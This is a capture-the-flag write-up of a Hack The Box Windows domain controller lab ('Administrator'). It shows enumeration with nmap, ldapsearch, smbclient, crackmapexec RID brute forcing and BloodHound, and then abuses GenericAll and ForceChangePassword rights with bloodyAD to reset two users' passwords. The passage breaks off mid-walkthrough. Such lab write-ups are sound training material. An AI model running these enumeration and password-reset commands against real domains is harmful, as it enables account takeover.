## Recon
First of all, on the machine description there are already some user credentials:

_As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich_

First, let's do an `nmap` scan:
```
└─$ nmap -p- --min-rate 10000 -T4 $target 1> ports.txt && echo "All discovered open ports:" && cat ports.txt && nmap -sC -sV -p$(tail -n +7 ports.txt | head -n -2 | cut -d ' ' -f 1 | cut -d '/' -f 1 | sed -z 's/\n/,/g') $target | tee nmap.txt
All discovered open ports:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 20:12 CEST
Nmap scan report for 10.10.11.42
Host is up (0.043s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
56356/tcp open  unknown
56360/tcp open  unknown
56362/tcp open  unknown
56381/tcp open  unknown
56413/tcp open  unknown
61899/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 20:12 CEST
Nmap scan report for 10.10.11.42
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 01:11:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
56356/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56360/tcp open  msrpc         Microsoft Windows RPC
56362/tcp open  msrpc         Microsoft Windows RPC
56381/tcp open  msrpc         Microsoft Windows RPC
56413/tcp open  msrpc         Microsoft Windows RPC
61899/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-01T01:12:47
|_  start_date: N/A
|_clock-skew: 6h59m10s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.88 seconds
```

Looks like this is an AD DC...

- **DNS**
- **Kerberos**: AD authentication service
- **msrpc**: Microsoft Remote Procedure Call, is a service that lets clients request services or run code on the remote server, is used, for example by smb.
- **Kpasswd5**: Service for changing kerberos passwords.
- **netbios**: For resolving names, session establishment, ...
- **ldap**: For active directory

I also see that it has WinRM for remote administration. And multiple RPC endpoints.

Let's try to do a ldap query to see if the permissions are misconfigured and can be exploited to see additional information of the domain without an authenticated account.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ ldapsearch -x -H ldap://$target -b "" -s base "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=administrator,DC=htb
ldapServiceName: administrator.htb:dc$@ADMINISTRATOR.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=administrator,DC
 =htb
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=administrator,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=administrator,DC=htb
namingContexts: DC=administrator,DC=htb
namingContexts: CN=Configuration,DC=administrator,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=administrator,DC=htb
namingContexts: DC=DomainDnsZones,DC=administrator,DC=htb
namingContexts: DC=ForestDnsZones,DC=administrator,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 131212
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=administrator,DC=htb
dnsHostName: dc.administrator.htb
defaultNamingContext: DC=administrator,DC=htb
currentTime: 20250401012609.0Z
configurationNamingContext: CN=Configuration,DC=administrator,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

I add the machine hostname on the hosts file, it can be seen on the ldap query **dnsHostName: dc.administrator.htb** a part from that info, I don't see anything else especial.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       zero
10.10.11.42     administrator.htb dc.administrator.htb
```

As expected, I can't do any more advanced queries (I query all the users with the `objectClass=user` filter ):
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ ldapsearch -x -H ldap://$target -b "DC=administrator,DC=htb" -s sub "(objectClass=user)"  
# extended LDIF
#
# LDAPv3
# base <DC=administrator,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

I try to connect via FTP, but it gives the error **530 User cannot log in, home directory inaccessible.** This is very interesting, because when ftp into server, it connects to the users's home directory, like a chroot in linux, worth noting once we get more user credentials.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:oriol): olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 
```

Let's connect with the credentials given, first I try to connect via SMB:
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient -L administrator.htb -U olivia%ichliebedich 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to administrator.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


I try to connect to the default shared folders (ADMIN\$, C\$, IPC\$) but no luck, but there is something interesting on `SYSVOL`
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient \\\\administrator.htb\\NETLOGON -U olivia%ichliebedich 
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Fri Oct  4 21:48:08 2024
  ..                                  D        0  Fri Oct  4 21:54:15 2024

5606911 blocks of size 4096. 1857309 blocks available
smb: \> exit
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient \\\\administrator.htb\\SYSVOL -U olivia%ichliebedich
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct  4 21:48:08 2024
  ..                                  D        0  Fri Oct  4 21:48:08 2024
  administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024

5606911 blocks of size 4096. 1857309 blocks available
smb: \> cd administrator.htb
smb: \administrator.htb\> ls
  .                                   D        0  Fri Oct  4 21:54:15 2024
  ..                                  D        0  Fri Oct  4 21:48:08 2024
  DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
  Policies                            D        0  Fri Oct  4 21:48:32 2024
  scripts                             D        0  Fri Oct  4 21:48:08 2024

5606911 blocks of size 4096. 1857053 blocks available
smb: \administrator.htb\>
```

I follow the first answer of this superuser question to recursively download all the files on the `administrator.htb` directory
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient \\\\administrator.htb\\SYSVOL -U olivia%ichliebedich
Try "help" to get a list of possible commands.
smb: \> cd administrator.htb
smb: \administrator.htb\> ls
  .                                   D        0  Fri Oct  4 21:54:15 2024
  ..                                  D        0  Fri Oct  4 21:48:08 2024
  DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
  Policies                            D        0  Fri Oct  4 21:48:32 2024
  scripts                             D        0  Fri Oct  4 21:48:08 2024

                5606911 blocks of size 4096. 2060375 blocks available
smb: \administrator.htb\> mask ""
smb: \administrator.htb\> recurse ON
smb: \administrator.htb\> prompt OFF
smb: \administrator.htb\> mget *
NT_STATUS_ACCESS_DENIED listing \administrator.htb\DfsrPrivate\*
getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2802 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (16.1 KiloBytes/sec) (average 5.5 KiloBytes/sec)
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\comment.cmtx of size 553 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx (3.2 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol of size 184 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol (1.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.3 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 4262 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (24.2 KiloBytes/sec) (average 7.4 KiloBytes/sec)
smb: \administrator.htb\> 
```

The folders `DfsrPrivate` and `scripts` are empty, but the `policies` seems to (obviously) have some windows policies inside:
```
┌──(oriol㉿zero)-[~/htb/administrator/Policies]
└─$ ls
{31B2F340-016D-11D2-945F-00C04FB984F9}  {6AC1786C-016F-11D2-945F-00C04fB984F9}
                                                                                                                                                                                                                                            
┌──(oriol㉿zero)-[~/htb/administrator/Policies]
└─$ tree                        
.
├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   ├── GPT.INI
│   ├── MACHINE
│   │   ├── Microsoft
│   │   │   └── Windows NT
│   │   │       └── SecEdit
│   │   │           └── GptTmpl.inf
│   │   ├── Registry.pol
│   │   └── Scripts
│   │       ├── Shutdown
│   │       └── Startup
│   └── USER
└── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    ├── GPT.INI
    ├── MACHINE
    │   ├── Microsoft
    │   │   └── Windows NT
    │   │       └── SecEdit
    │   │           └── GptTmpl.inf
    │   ├── Registry.pol
    │   ├── Scripts
    │   │   ├── Shutdown
    │   │   └── Startup
    │   └── comment.cmtx
    └── USER

19 directories, 7 files
```

The Group Policy Templates or GPT (which are AD GPOs) are stored on the Policies directory inside the SYSVOL one. This is where the AD computer clients download the policies, and also the different AD DC replicate.

Looking at it, those are 2 different GPOs.
- **GPT.INI** Contains basinc information about the GPO, like version, display name and others
- **Machine directory** contains computer-specific policy settings:
	- **Registry.pol** Stores registry-based policy settings that apply to computers
	- **Scripts:** Contains shutdown and startup scripts
	- **Microsoft/Windows NT/SecEdit/GptTmpl.inf** Security template containing security policy settings
- **User** directory contains user-specific policy settings
- **comment.cmtx** Administrative comments

- https://sdmsoftware.com/whitepapers/understanding-group-policy-storage/


I don't see anything useful on the comment.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ cat Policies/\{6AC1786C-016F-11D2-945F-00C04fB984F9\}/MACHINE/comment.cmtx 
<?xml version='1.0' encoding='utf-8'?>
<policyComments xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" revision="1.0" schemaVersion="1.0" xmlns="http://www.microsoft.com/GroupPolicy/CommentDefinitions">
  <policyNamespaces>
    <using prefix="ns0" namespace="Microsoft.Policies.TerminalServer"></using>
  </policyNamespaces>
  <comments>
    <admTemplate></admTemplate>
  </comments>
  <resources minRequiredRevision="1.0">
    <stringTable></stringTable>
  </resources>
</policyComments>
```

There are no interesting comments. I don't get the namespace TerminalServer, as it doesn't have the rdp port open... maybe something like session time limits or device redirection(?)

Let's check the `GptTmpl.inf` which includes security policy settings.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ cat Policies/\{6AC1786C-016F-11D2-945F-00C04fB984F9\}/MACHINE/Microsoft/Windows\ NT/SecEdit/GptTmpl.inf 
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
SeAuditPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeBatchLogonRight = *S-1-5-32-568,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
SeInteractiveLogonRight = *S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-32-551,*S-1-5-32-544,*S-1-5-21-1088858960-373806567-254189436-1112,*S-1-5-32-548
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
```

The signature is `$CHICAGO$`  indicating that is a valid inf for windows.
This lines:
```
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
```

Are registry values, with the full path, and the type (4) and value (1) at the end. In this case the type of all is a DWORD
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/3a14ca47-a22f-43c5-b35e-6be791003ca7
And what this do is (by order)
- Enforces LDAP signing (prevents downgrade attacks).
- Enforces Netlogon channel encryption
- Requires SMB packet signing
- Enables SMB signing

And then, the `[Privilege Rights]` sets different privileges to some SID. Some of them are the "default ones", like the `*S-1-5-32-544` which is **BUILTIN\Administrators**
More on the SID can be found in here:
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers

I see some SID which are not default and are custom, maybe I'll come back later here once I've got more users.

I will do a RID brute force scan to discover new users and groups
```
┌──(oriol㉿zero)-[~]
└─$ crackmapexec smb administrator.htb -u olivia -p 'ichliebedich' --users --rid-brute
SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         administrator.htb 445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         administrator.htb 445    DC               [+] Enumerated domain user(s)
SMB         administrator.htb 445    DC               administrator.htb\emma                           badpwdcount: 8 desc: 
SMB         administrator.htb 445    DC               administrator.htb\alexander                      badpwdcount: 4 desc: 
SMB         administrator.htb 445    DC               administrator.htb\ethan                          badpwdcount: 0 desc: 
SMB         administrator.htb 445    DC               administrator.htb\emily                          badpwdcount: 0 desc: 
SMB         administrator.htb 445    DC               administrator.htb\benjamin                       badpwdcount: 0 desc: 
SMB         administrator.htb 445    DC               administrator.htb\michael                        badpwdcount: 3 desc: 
SMB         administrator.htb 445    DC               administrator.htb\olivia                         badpwdcount: 0 desc: 
SMB         administrator.htb 445    DC               administrator.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         administrator.htb 445    DC               administrator.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         administrator.htb 445    DC               administrator.htb\Administrator                  badpwdcount: 1 desc: Built-in account for administering the computer/domain
SMB         administrator.htb 445    DC               [+] Brute forcing RIDs
SMB         administrator.htb 445    DC               498: ADMINISTRATOR\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB         administrator.htb 445    DC               501: ADMINISTRATOR\Guest (SidTypeUser)
SMB         administrator.htb 445    DC               502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB         administrator.htb 445    DC               512: ADMINISTRATOR\Domain Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               513: ADMINISTRATOR\Domain Users (SidTypeGroup)
SMB         administrator.htb 445    DC               514: ADMINISTRATOR\Domain Guests (SidTypeGroup)
SMB         administrator.htb 445    DC               515: ADMINISTRATOR\Domain Computers (SidTypeGroup)
SMB         administrator.htb 445    DC               516: ADMINISTRATOR\Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               517: ADMINISTRATOR\Cert Publishers (SidTypeAlias)
SMB         administrator.htb 445    DC               518: ADMINISTRATOR\Schema Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               519: ADMINISTRATOR\Enterprise Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               520: ADMINISTRATOR\Group Policy Creator Owners (SidTypeGroup)
SMB         administrator.htb 445    DC               521: ADMINISTRATOR\Read-only Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               522: ADMINISTRATOR\Cloneable Domain Controllers (SidTypeGroup)
SMB         administrator.htb 445    DC               525: ADMINISTRATOR\Protected Users (SidTypeGroup)
SMB         administrator.htb 445    DC               526: ADMINISTRATOR\Key Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               527: ADMINISTRATOR\Enterprise Key Admins (SidTypeGroup)
SMB         administrator.htb 445    DC               553: ADMINISTRATOR\RAS and IAS Servers (SidTypeAlias)
SMB         administrator.htb 445    DC               571: ADMINISTRATOR\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         administrator.htb 445    DC               572: ADMINISTRATOR\Denied RODC Password Replication Group (SidTypeAlias)
SMB         administrator.htb 445    DC               1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB         administrator.htb 445    DC               1101: ADMINISTRATOR\DnsAdmins (SidTypeAlias)
SMB         administrator.htb 445    DC               1102: ADMINISTRATOR\DnsUpdateProxy (SidTypeGroup)
SMB         administrator.htb 445    DC               1108: ADMINISTRATOR\olivia (SidTypeUser)
SMB         administrator.htb 445    DC               1109: ADMINISTRATOR\michael (SidTypeUser)
SMB         administrator.htb 445    DC               1110: ADMINISTRATOR\benjamin (SidTypeUser)
SMB         administrator.htb 445    DC               1111: ADMINISTRATOR\Share Moderators (SidTypeAlias)
SMB         administrator.htb 445    DC               1112: ADMINISTRATOR\emily (SidTypeUser)
SMB         administrator.htb 445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
SMB         administrator.htb 445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
SMB         administrator.htb 445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
```

We got the users:
- michael
- benjamin
- emily
- ethan
- alexander
- emma

**How does the RID brute force work?**
What is RID? Is the last bit of the SID which represents the user. For example the RID of 500 is for the Administrator.
First, we need some user credentials because the anonymous enumeration is blocked and the SID to name translation.
 - Establish an smb session with the credentials provided
 - Gets the SID bit that corresponds to the domain querying the known administrator SID
 - Uses Local Security Authority (LSARPC) to query SID with the RID from 500 to a high number.
 - Gets the successful SID with the random RID that translated to a user

Looking a the policies inf file, I see that the user emily has `SeInteractiveLogonRight` privileges, which a quick search returns that this privilege allows the user to log remotely to the computer.
- https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally

Let's try to use Bloodhound to export all the AD information available to see the relationships and possible attack vectors graphically
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ bloodhound-python -u olivia -p "ichliebedich" -d administrator.htb -ns 10.10.11.42 -c All
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 08S
```

I feed the jsons to the database and analyze a little bit the AD connections.

I see this:
![[administrator01.png]]

Olivia has a "First Degree Object Control" of the user Michael with `GenericAll` properties, this means we can change the user's password, or use a credentials shadow attack, like on the EscapeTwo machine.

And then, Michael has `ForceChangePassword` privileges on the user Benjamin.
![[administrator02.png]]

Then, Benjamin doesn't have any more privileges on other users, but I think it's pretty clear that the user flag is on the Benjamin user, and from there we'll escalate privileges.

## Attack phase
### User
I don't even bother to remote shell with the Olivia user and go directly to do a shadow credential attack on the Michael user. I re-use the commands from the EscpeTwo machine.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ certipy-ad shadow auto -u 'rosa@administrator.htb' -p "ichliebedich" -account 'michael' -dc-ip 10.10.11.42
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
[-] Use -debug to print a stacktrace
```

It raises an error... Looking at the internet it's because the server doesn't have LDAP over SSH enabled:
- https://github.com/fortra/impacket/issues/581

So, let's try to change the password of the user. I will have to be quick to also reset the password of Benjamin, as, from my experience, there is some cleanup script that reset the password to the original one to not interfere the experience of the other users playing this box.

I will use `bloody-ad` with the `set password` command.
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "zero123"
[+] Password changed successfully!
```

Do the same for Benjamin:
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ bloodyAD -u "michael" -p "zero123" -d "Administrator.htb" --host "10.10.11.42" set password "benjamin" "zero123"
[+] Password changed successfully!
```

Seems like Benjamin can't remote to the server:
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ evil-winrm -i administrator.htb -u "benjamin" -p "zero123"
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint


                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

Maybe smb?
```
┌──(oriol㉿zero)-[~/htb/administrator]
└─$ smbclient -L administrator.htb -U benjamin%zero123        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
